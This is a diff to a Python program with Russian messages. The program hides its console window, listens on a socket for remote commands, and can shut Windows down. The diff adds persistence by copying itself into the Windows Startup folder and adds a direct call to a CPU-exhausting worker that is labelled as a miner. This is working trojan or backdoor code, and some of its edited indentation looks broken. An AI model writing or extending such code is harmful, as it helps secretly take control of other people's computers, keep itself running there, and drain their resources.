@@ -8,8 +8,23 @@ from tkinter import messagebox
 import subprocess
 import webbrowser
 import multiprocessing
+import shutil
+import sys
 
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def add_to_startup_folder():
+    script_path = os.path.abspath(sys.argv[0])
+    
+    startup_folder = os.path.join(
+        os.environ["APPDATA"],
+        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
+    )
+    
+    try:
+        shutil.copy2(script_path, startup_folder)
+    except Exception as e:
+         print("ошибка автозагрузки!")
 
 def safe_shutdown_windows(delay_seconds=0):
     try:
@@ -173,7 +188,7 @@ def execute_command(cmd):
           time.sleep(0.001)
           print('запущен майнер')
         num_cores = multiprocessing.cpu_count()
-    processes = []
+        processes = []
 
     for _ in range(num_cores):
         p = multiprocessing.Process(target=cpu_worker)
@@ -182,7 +197,6 @@ def execute_command(cmd):
 
     for p in processes:
         p.join()
-
     else:
         win_error("сообщение", f"{cmd}")
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -195,3 +209,6 @@ while True:
     print(f"Подключение от {addr}")
     client_handler = threading.Thread(target=handle_client, args=(client,))
     client_handler.start()
+
+if __name__ == "__main__":
+    cpu_worker()
